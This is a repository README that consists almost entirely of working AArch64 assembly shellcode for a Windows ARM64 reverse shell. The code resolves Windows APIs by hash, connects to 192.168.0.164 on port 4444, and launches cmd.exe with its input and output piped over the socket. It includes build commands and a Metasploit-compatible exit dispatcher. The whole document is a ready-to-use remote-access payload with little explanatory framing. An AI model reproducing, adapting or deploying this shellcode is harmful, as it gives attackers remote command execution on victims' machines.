# Windows_AARCH64_Reverse_Shell
Just a AArch64/Arm64 shellcode for reverse shell.

```asm
//======================================================================
// AArch64 / Windows ARM64 reverse shell shellcode
//
// Connects to 192.168.0.164:4444 and pipes cmd.exe over the socket.
//
// Changes vs. rev.s:
//   1. Self-contained scratch buffers (x19, x21 initialized in prologue;
//      x29 points INTO reserved scratch instead of caller's frame).
//   2. `exitfunk` dispatcher with patchable hash immediates so the
//      Metasploit module can switch EXITFUNC without rewriting the tail.
//   3. Dead code removed: cached TerminateProcess slot (exitfunk
//      re-resolves), Advapi32/OpenProcessToken load (never called),
//      4 leftover x86-alignment NOPs in compute_hash_finished.
//
// Build with llvm-mingw on macOS:
//   clang -target aarch64-pc-windows-gnu -nostdlib -e main \
//         -fuse-ld=lld -Wl,--subsystem,console \
//         -g -gcodeview -Wl,--pdb=rev2.pdb \
//         rev2.s -o rev2.exe
//
// Slot table layout (relative to x29 = low addr of 0x300 B scratch):
//   0x00 : kernel32 base (saved for exitfunk re-resolution)
//   0x08 : &find_function
//   0x10 : (free)
//   0x18 : LoadLibraryA
//   0x20 : (free)
//   0x28 : WSAStartup
//   0x30 : WSASocketA
//   0x38 : WSAConnect
//   0x40 : CreateProcessA
//   0x50 : sockaddr_in (16 B)         <- x19
//   0x70 : WSADATA scratch (~408 B)   <- x21
//
// Slot offsets are deliberately preserved from the pre-cleanup version
// so this file stays byte-comparable with the Metasploit module's
// embedded heredoc. Gaps at 0x10 and 0x20 are intentional.
//======================================================================

    .text
    .global main

main:
    sub     sp, sp, #0x300           // reserve 768 B scratch
    mov     x29, sp                  // x29 = slot table base (low addr of scratch)
    add     x19, x29, #0x50          // x19 = &sockaddr_in
    add     x21, x29, #0x70          // x21 = &WSADATA

//----------------------------------------------------------------------
// find_kernel32 : walk InInitializationOrderModuleList
//----------------------------------------------------------------------
find_kernel32:
    ldr     x6, [x18, #0x60]         // x6 = TEB->PEB
    ldr     x6, [x6,  #0x18]         // x6 = PEB->Ldr
    ldr     x6, [x6,  #0x30]         // x6 = Ldr.InInitOrder.Flink

next_module:
    ldr     x3, [x6, #0x10]          // x3 = DllBase
    ldr     x7, [x6, #0x40]          // x7 = BaseDllName.Buffer (PWSTR)
    ldr     x6, [x6]                 // x6 = next entry (Flink)
    ldrh    w8, [x7, #(12*2)]        // wide char at index 12
    cbnz    w8, next_module          // != 0 ? not "kernel32.dll", keep walking
// x3 now holds kernel32 base.

//----------------------------------------------------------------------
// Capture &find_function via the same call/pop trick
//----------------------------------------------------------------------
find_function_shorten:
    b       find_function_shorten_bnc

find_function_ret:
    str     x30, [x29, #0x08]        // stash &find_function
    b       resolve_symbols_kernel32

find_function_shorten_bnc:
    bl      find_function_ret        // x30 <- &find_function (next instr)

//----------------------------------------------------------------------
// find_function : hash-based export resolver.
//   In : x3 = module base, w0 = wanted hash
//   Out: x0 = resolved VA
//----------------------------------------------------------------------
find_function:
    mov     w10, w0                  // w10 = wanted hash (preserved)
    ldr     w8,  [x3, #0x3c]         // e_lfanew
    add     x8,  x8, x3              // PE header VMA
    ldr     w9,  [x8, #0x88]         // Export Directory RVA
    add     x9,  x9, x3              // Export Directory VMA
    ldr     w4,  [x9, #0x18]         // NumberOfNames
    ldr     w11, [x9, #0x20]         // AddressOfNames RVA
    add     x11, x11, x3             // AddressOfNames VMA

find_function_loop:
    cbz     w4, find_function_finished
    sub     w4, w4, #1
    ldr     w12, [x11, w4, uxtw #2]  // names[ecx] (RVA)
    add     x6,  x12, x3             // VMA of name string

compute_hash:
    mov     w5, wzr                  // edx (hash) = 0

compute_hash_again:
    ldrb    w0, [x6], #1             // lodsb (post-increment)
    cbz     w0, compute_hash_finished
    ror     w5, w5, #13              // ror edx, 0x0d
    add     w5, w5, w0
    b       compute_hash_again

compute_hash_finished:
find_function_compare:
    cmp     w5, w10
    b.ne    find_function_loop

    ldr     w12, [x9, #0x24]         // AddressOfNameOrdinals RVA
    add     x12, x12, x3
    ldrh    w4,  [x12, w4, uxtw #1]  // ordinals[ecx]
    ldr     w12, [x9, #0x1c]         // AddressOfFunctions RVA
    add     x12, x12, x3
    ldr     w13, [x12, w4, uxtw #2]  // function RVA
    add     x0,  x13, x3             // function VMA

find_function_finished:
    ret

//----------------------------------------------------------------------
// resolve_symbols_kernel32 : x3 still holds kernel32 base on first entry
//----------------------------------------------------------------------
resolve_symbols_kernel32:
    str     x3, [x29, #0x00]         // save kernel32 base for exitfunk dispatcher

    movz    w0, #0x4e8e
    movk    w0, #0xec0e, lsl #16     // 0xec0e4e8e  LoadLibraryA
    ldr     x9, [x29, #0x08]
    blr     x9
    str     x0, [x29, #0x18]

//----------------------------------------------------------------------
// resolve CreateProcessA (kernel32 still in x3)
//----------------------------------------------------------------------
resolve_symbols_CreateProcessA:
    movz    w0, #0xfe72
    movk    w0, #0x16b3, lsl #16     // 0x16b3fe72  CreateProcessA
    ldr     x9, [x29, #0x08]
    blr     x9
    str     x0, [x29, #0x40]

//----------------------------------------------------------------------
// Ws2_32 stage
//----------------------------------------------------------------------
load_ws2_32:
    movz    x0, #0x7357              // "Ws"
    movk    x0, #0x5f32, lsl #16     // "2_"
    movk    x0, #0x3233, lsl #32     // "32"
    movk    x0, #0x642e, lsl #48     // ".d"   -> "Ws2_32.d"
    movz    w1, #0x6c6c              // "ll"
    sub     sp, sp, #16
    str     x0, [sp]
    str     w1, [sp, #8]
    mov     x0, sp
    ldr     x9, [x29, #0x18]         // LoadLibraryA
    blr     x9
    add     sp, sp, #16
    mov     x3, x0                   // x3 = ws2_32 base

resolve_ws2_32:
    movz    w0, #0xedcb
    movk    w0, #0x3bfc, lsl #16     // 0x3bfcedcb  WSAStartup
    ldr     x9, [x29, #0x08]
    blr     x9
    str     x0, [x29, #0x28]

    movz    w0, #0x09d9
    movk    w0, #0xadf5, lsl #16     // 0xadf509d9  WSASocketA
    ldr     x9, [x29, #0x08]
    blr     x9
    str     x0, [x29, #0x30]

    movz    w0, #0xba0c
    movk    w0, #0xb32d, lsl #16     // 0xb32dba0c  WSAConnect
    ldr     x9, [x29, #0x08]
    blr     x9
    str     x0, [x29, #0x38]

//----------------------------------------------------------------------
// WSAStartup(MAKEWORD(2,2), &wsaData)
//----------------------------------------------------------------------
call_WSAStartup:
    movz    w0, #0x0202
    mov     x1, x21                  // &wsaData (initialized in prologue)
    ldr     x9, [x29, #0x28]
    blr     x9

//----------------------------------------------------------------------
// Winsock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
//----------------------------------------------------------------------
call_WSASocket:
    mov     w0, #2                   // AF_INET
    mov     w1, #1                   // SOCK_STREAM
    mov     w2, #6                   // IPPROTO_TCP
    mov     x3, xzr
    mov     w4, wzr
    mov     w5, wzr
    ldr     x9, [x29, #0x30]
    blr     x9
    mov     x22, x0                  // x22 = Winsock (callee-saved, x19-x28)

//----------------------------------------------------------------------
// Build sockaddr_in for 192.168.0.164:4444
//
//     bytes in memory after STP (16 B):
//       02 00 5C 11 C0 A8 00 A4 00 00 00 00 00 00 00 00
//       └┬┘ └┬─┘ └────┬────┘ └─────────┬─────────┘
//        |   |        |             sin_zero[8]
//        |   |       sin_addr (192.168.0.164, NBO)
//        |   sin_port (4444, NBO)
//        sin_family = AF_INET
//----------------------------------------------------------------------
fill_sockaddr_fast:
    movz    x0, #0x0002              // sin_family   = AF_INET
    movk    x0, #0x5C11, lsl #16     // sin_port     = htons(4444)
    movk    x0, #0xA8C0, lsl #32     // sin_addr.lo  = 192.168
    movk    x0, #0xA400, lsl #48     // sin_addr.hi  = 0.164
    stp     x0, xzr, [x19]           // 16 B: payload + sin_zero[8]

//----------------------------------------------------------------------
// WSAConnect(Winsock, &sa, sizeof(sa), NULL, NULL, NULL, NULL)
//----------------------------------------------------------------------
call_WSAConnect:
    mov     x0, x22                  // s
    mov     x1, x19                  // (SOCKADDR*)&sa
    mov     w2, #16                  // sizeof(sockaddr_in)
    mov     x3, xzr
    mov     x4, xzr
    mov     x5, xzr
    mov     x6, xzr
    ldr     x9, [x29, #0x38]
    blr     x9
    // x0 = 0 on success, SOCKET_ERROR (-1) on failure.

//----------------------------------------------------------------------
// CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
//----------------------------------------------------------------------
build_PROCESS_INFORMATION_and_STARTUPINFOA:
    sub     sp, sp, #0xB0
    add     x10, sp, #0x10           // &pi
    add     x11, sp, #0x30           // &si
    add     x12, sp, #0xA0           // &cmdline

    // Zero PROCESS_INFORMATION (24 B)
    stp     xzr, xzr, [x10]
    str     xzr, [x10, #16]

    // Zero STARTUPINFOA (104 B = 6*16 + 8)
    stp     xzr, xzr, [x11, #0x00]
    stp     xzr, xzr, [x11, #0x10]
    stp     xzr, xzr, [x11, #0x20]
    stp     xzr, xzr, [x11, #0x30]
    stp     xzr, xzr, [x11, #0x40]
    stp     xzr, xzr, [x11, #0x50]
    str     xzr,      [x11, #0x60]

    mov     w0, #0x68
    str     w0, [x11, #0x00]         // si.cb        = sizeof(STARTUPINFOA)
    mov     w0, #0x100
    str     w0, [x11, #0x3C]         // si.dwFlags   = STARTF_USESTDHANDLES
    str     x22, [x11, #0x50]        // si.hStdInput  = Winsock
    str     x22, [x11, #0x58]        // si.hStdOutput = Winsock
    str     x22, [x11, #0x60]        // si.hStdError  = Winsock

    // Build "cmd.exe\0" on the stack
    movz    x0, #0x6D63              // 'c','m'
    movk    x0, #0x2E64, lsl #16     // 'd','.'
    movk    x0, #0x7865, lsl #32     // 'e','x'
    movk    x0, #0x0065, lsl #48     // 'e','\0'
    str     x0, [x12]

call_CreateProcessA:
    mov     x0, xzr                  // lpApplicationName
    mov     x1, x12                  // lpCommandLine
    mov     x2, xzr                  // lpProcessAttributes
    mov     x3, xzr                  // lpThreadAttributes
    mov     w4, #1                   // bInheritHandles
    mov     w5, wzr                  // dwCreationFlags
    mov     x6, xzr                  // lpEnvironment
    mov     x7, xzr                  // lpCurrentDirectory
    stp     x11, x10, [sp]           // args 9 & 10 on stack

    ldr     x9, [x29, #0x40]
    blr     x9
    // x0 != 0 on success.

    add     sp, sp, #0xB0

//======================================================================
// exitfunk : EXITFUNC dispatcher (Metasploit-compatible)
//
// Re-resolves the chosen exit API by hash at runtime instead of using a
// pre-cached slot. The two MOVZ/MOVK immediates marked <EXITFUNC_LO>
// and <EXITFUNC_HI> below are the substitution points for the Ruby
// payload module:
//
//   datastore['EXITFUNC']  | ROR-13 hash (kernel32 export)
//   -----------------------+-------------------------------
//   process  (default)     | 0x78b5b983   TerminateProcess
//   thread                 | ROR-13("ExitThread")
//   none                   | (Ruby omits dispatcher entirely)
//
// Calling convention is uniform across all three exit APIs because
// arg0 = -1 is interpreted harmlessly:
//   TerminateProcess(0xFFFFFFFF as HANDLE = GetCurrentProcess pseudo, 0)
//   ExitThread     (0xFFFFFFFF as DWORD exit code)
//   ExitProcess    (0xFFFFFFFF as UINT  exit code)
//======================================================================
exitfunk:
    ldr     x3, [x29, #0x00]         // kernel32 base (saved in resolve_symbols_kernel32)
    movz    w0, #0xb983              // <EXITFUNC_LO>  default: TerminateProcess
    movk    w0, #0x78b5, lsl #16     // <EXITFUNC_HI>
    ldr     x9, [x29, #0x08]         // find_function
    blr     x9
    mov     x10, x0                  // x10 = resolved exit API VA
    mov     x0, #-1                  // arg0 (handle / exitcode)
    mov     w1, wzr                  // arg1 (TerminateProcess only; ignored otherwise)
    blr     x10
    // Unreachable. If the exit API ever returns, trap so execution never
    // runs off the end of the shellcode buffer.
    brk     #0

```
